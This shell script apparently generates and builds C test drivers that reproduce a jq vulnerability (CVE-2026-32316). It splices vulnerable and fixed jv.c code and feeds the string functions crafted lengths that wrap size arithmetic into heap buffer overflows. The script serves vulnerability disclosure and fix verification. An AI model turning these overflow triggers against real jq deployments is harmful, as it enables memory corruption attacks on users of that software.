#!/bin/sh
# Direct-call harness for CVE-2026-32316 / GHSA-q3h9-m34w-h76f (jq).
# Verbatim pinned bytes from src/jv.c at tags jq-1.8.1 (vuln) and jq-1.8.2
# (fixed); #line keeps the pinned source line numbers. No jq build, JSON
# parser, jq process, file, socket or network is involved.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SRC=$(CDPATH= cd -- "$HERE/../src" && pwd)
OUT="$HERE/evidence"
mkdir -p "$OUT"

gen_driver() { # variant
    v=$1
    if [ "$v" = vuln ]; then
        badlo=1113; badhi=1134; applo=1174; apphi=1198; tag=v1.8.1
    else
        badlo=1112; badhi=1138; applo=1178; apphi=1206; tag=v1.8.2
    fi
    sed -n "${badlo},${badhi} p" "$SRC/jv.c.$v" > "$HERE/slice-bad-$v.inc"
    sed -n "${applo},${apphi} p" "$SRC/jv.c.$v" > "$HERE/slice-append-$v.inc"

    cat > "$HERE/driver-$v.c" <<'HEADER'
/* Harness scaffolding only; the two #line blocks below are verbatim pinned
 * jq bytes. Nothing here is a jq build, JSON parser or live jq process.
 * memcpy and jvp_utf8_encode are macros that cap the *executed* copy at 48
 * bytes so a 2 GiB copy is observable without allocating 2 GiB; the requested
 * length is recorded from the verbatim expression and printed. */
#include <assert.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

typedef enum { JV_KIND_INVALID, JV_KIND_NULL, JV_KIND_FALSE, JV_KIND_TRUE,
               JV_KIND_NUMBER, JV_KIND_STRING, JV_KIND_ARRAY, JV_KIND_OBJECT } jv_kind;
struct jv_refcnt;
typedef struct {
    unsigned char kind_flags;
    unsigned char pad_;
    unsigned short offset;
    int size;
    union { struct jv_refcnt* ptr; double number; } u;
} jv;
typedef struct jv_refcnt { int count; } jv_refcnt;
typedef struct {
    jv_refcnt refcnt;
    uint32_t hash;
    uint32_t length_hashed;
    uint32_t alloc_length;
    char data[];
} jvp_string;
#define KIND_MASK 0xF
#define PFLAGS_MASK 0xF0
#define JVP_MAKE_FLAGS(kind, pflags) (((kind) & KIND_MASK) | ((pflags) & PFLAGS_MASK))
#define JVP_FLAGS_STRING JVP_MAKE_FLAGS(JV_KIND_STRING, 0x80)
#define JVP_KIND(j) ((j).kind_flags & KIND_MASK)
#define JVP_HAS_KIND(j, k) (JVP_KIND(j) == (k))
#define JVP_FLAGS(j) ((j).kind_flags)

static jv_refcnt hc_msg_refcnt = { 1 };
static uint32_t hc_alloc_size = 0;
static jvp_string* hc_last = NULL;
static size_t hc_req[2] = { 0, 0 };
static int hc_nreq = 0;
static int hc_utf8_calls = 0;
static const char* hc_cursor = NULL;
static const char* hc_bound = NULL;
static unsigned char* hc_plain_base = NULL;
static size_t hc_plain_off = 0;
static const char hc_u8[3] = { 0x5a, 0x5a, 0x5a };

static size_t hc_capped(size_t n)
{ if (hc_nreq < 2) hc_req[hc_nreq] = n; hc_nreq++; return n > 48 ? 48 : n; }
#define memcpy(dst, src, n) __builtin_memcpy((dst), (src), hc_capped((n)))
/* The pinned call site stays in the ASan frame; the encode stub supplies
 * harness-chosen U+FFFD bytes, three per invocation. */
#define jvp_utf8_encode(c, out) (hc_utf8_calls++, __builtin_memcpy((out), hc_u8, 3), 3)

static jv jv_string(const char* msg) {
    jv r; memset(&r, 0, sizeof r);
    r.kind_flags = (unsigned char) JVP_FLAGS_STRING;
    r.u.ptr = (jv_refcnt*) msg;
    (void) hc_msg_refcnt;
    return r;
}
static jv jv_invalid_with_msg(jv msg) {
    jv r = msg; r.kind_flags = JV_KIND_INVALID; return r;
}
static jv jvp_string_ptr_check(jv a) { return a; }
static jvp_string* jvp_string_ptr(jv a)
{ (void) jvp_string_ptr_check; assert(JVP_HAS_KIND(a, JV_KIND_STRING)); return (jvp_string*) a.u.ptr; }
static jvp_string* jvp_string_alloc(uint32_t size) {
    jvp_string* s;
    hc_alloc_size = size;
#ifdef ASAN_CASE
    s = (jvp_string*) malloc(sizeof(jvp_string) + (size_t) size + 1);
#else
    /* 2 GiB of reserved, untouched virtual space: the pinned second memcpy
     * targets data + 0x7ffffffe and must be addressable in a plain run. */
    if (hc_plain_base == NULL) {
        hc_plain_base = (unsigned char*) mmap(NULL, 0x80010000UL,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
        if (hc_plain_base == MAP_FAILED) { perror("mmap"); exit(2); }
        hc_plain_off = 16;
    }
    hc_plain_off = (hc_plain_off + 15) & ~(size_t) 15;
    s = (jvp_string*) (hc_plain_base + hc_plain_off);
    hc_plain_off += sizeof(jvp_string) + (size_t) size + 1 + 32;
#endif
    s->refcnt.count = 1;
    s->hash = 0;
    s->length_hashed = 0;
    s->alloc_length = size;
    memset(s->data, 0, (size_t) size + 1);
    hc_last = s;
    return s;
}
static int jvp_refcnt_unshared(jv_refcnt* c) { assert(c->count > 0); return c->count == 1; }
static uint32_t jvp_string_length(jvp_string* s) { return s->length_hashed >> 1; }
static uint32_t jvp_string_remaining_space(jvp_string* s) {
    assert(s->alloc_length >= jvp_string_length(s));
    return s->alloc_length - jvp_string_length(s);
}
static void jvp_string_free(jv js) {
    jvp_string* s = jvp_string_ptr(js);
    s->refcnt.count--;
    if (s->refcnt.count == 0) {
#ifdef ASAN_CASE
        free(s);
#endif
    }
}
static void jv_free(jv x) { (void) x; }
static const char* jvp_utf8_next(const char* i, const char* end, int* c) {
    if (hc_cursor == NULL) { hc_cursor = i; hc_bound = end; }
    if (hc_utf8_calls >= 16 || hc_cursor >= hc_bound) return NULL;
    *c = -1;
    hc_cursor++;
    return hc_cursor - 1;
}

#line BADLINE "jv.c.VARIANT"
HEADER
    sed "s/BADLINE/$badlo/; s/VARIANT/$v/" "$HERE/driver-$v.c" > "$HERE/.driver-$v.tmp"
    # The header above is already written with a placeholder; substitute it.
    mv "$HERE/.driver-$v.tmp" "$HERE/driver-$v.c"
    cat "$HERE/slice-bad-$v.inc" >> "$HERE/driver-$v.c"
    printf '\n#line %s "jv.c.%s"\n' "$applo" "$v" >> "$HERE/driver-$v.c"
    cat "$HERE/slice-append-$v.inc" >> "$HERE/driver-$v.c"

    cat >> "$HERE/driver-$v.c" <<'FOOTER'

/* ---------------- scenarios (harness scaffolding) ---------------- */
static void hc_reset(void)
{ hc_alloc_size = 0; hc_last = NULL; hc_nreq = 0; hc_req[0] = hc_req[1] = 0;
  hc_utf8_calls = 0; hc_cursor = NULL; hc_bound = NULL; }

static void hc_sink(const char* label, uint32_t size)
{
    unsigned char* p;
    int i;
    if (hc_last == NULL) { printf("%s SINK=-\n", label); return; }
    p = (unsigned char*) hc_last->data + size;
    printf("%s SINK=", label);
    for (i = 0; i < 16; i++) printf("%02x", p[i]);
    printf("\n");
}

/* currlen = 2^31 - 2, len = 2: the pinned (currlen + len) * 2 wraps uint32_t
 * to 0, clamps to 32, then copies currlen bytes into the 32-byte buffer. */
static void run_append(void)
{
    jvp_string* old = jvp_string_alloc(64);
    jv in;
    char add[2] = { 0x5a, 0x5a };
    jv r;
    old->length_hashed = (uint32_t) (0x7ffffffeULL << 1);
    old->alloc_length = 0x7fffffffu;
    old->refcnt.count = 1;
    memset(old->data, 0x5a, 64);
    memset(&in, 0, sizeof in);
    in.kind_flags = (unsigned char) JVP_FLAGS_STRING;
    in.u.ptr = &old->refcnt;
    hc_reset();
    printf("DBG LEN=%u ALLOC=%u REM=%u COUNT=%d\n",
        jvp_string_length(old), old->alloc_length,
        jvp_string_remaining_space(old), old->refcnt.count);
    r = jvp_string_append(in, add, 2);
    if (JVP_KIND(r) == JV_KIND_INVALID) {
        printf("APPEND REJECT=1\n");
    } else {
        printf("APPEND ALLOC=%lu REQ1=%lu REQ2=%lu KIND=%d\n",
            (unsigned long) hc_alloc_size, (unsigned long) hc_req[0],
            (unsigned long) hc_req[1], (int) JVP_KIND(r));
        hc_sink("APPEND", hc_alloc_size);
    }
    old->refcnt.count = 1;
    {
        jv keep = { 0 }; keep.kind_flags = (unsigned char) JVP_FLAGS_STRING;
        keep.u.ptr = &old->refcnt;
        jvp_string_free(keep);
    }
}

/* length = 0x5555555b: length * 3 + 1 wraps uint32_t to 6, then the pinned
 * loop writes three chosen bytes per invalid UTF-8 byte. NDEBUG models a
 * release build, where the pinned assert is compiled out. */
static void run_bad(void)
{
    char* data = (char*) malloc(64);
    jv r;
    memset(data, 0xff, 64);
    hc_reset();
    r = jvp_string_copy_replace_bad(data, 1431655767u);
    if (JVP_KIND(r) == JV_KIND_INVALID) {
        printf("BAD REJECT=1\n");
    } else {
        printf("BAD ALLOC=%lu U8CALLS=%d KIND=%d\n",
            (unsigned long) hc_alloc_size, hc_utf8_calls, (int) JVP_KIND(r));
        hc_sink("BAD", hc_alloc_size);
    }
    free(data);
}

int main(int argc, char** argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    /* "bad" isolates the second bug for ASan: the first overflow aborts the
     * default run before jvp_string_copy_replace_bad() is reached. */
    if (argc < 2 || strcmp(argv[1], "bad") != 0) run_append();
    run_bad();
    return 0;
}

FOOTER
}

for v in vuln fixed; do gen_driver "$v"; done

build() { # compiler variant mode
    cc=$1; v=$2; mode=$3
    bin="bin-$cc-$v-$mode"
    flags="-O0 -g -Wall -DNDEBUG"
    if [ "$mode" = asan ]; then
        flags="$flags -fsanitize=address -fno-omit-frame-pointer -DASAN_CASE"
    fi
    # shellcheck disable=SC2086
    "$cc" $flags -o "$HERE/$bin" "$HERE/driver-$v.c"
}

for cc in gcc clang; do
    for v in vuln fixed; do
        for mode in plain asan; do build "$cc" "$v" "$mode"; done
    done
done

printf 'generated drivers and 8 binaries in %s\n' "$HERE"
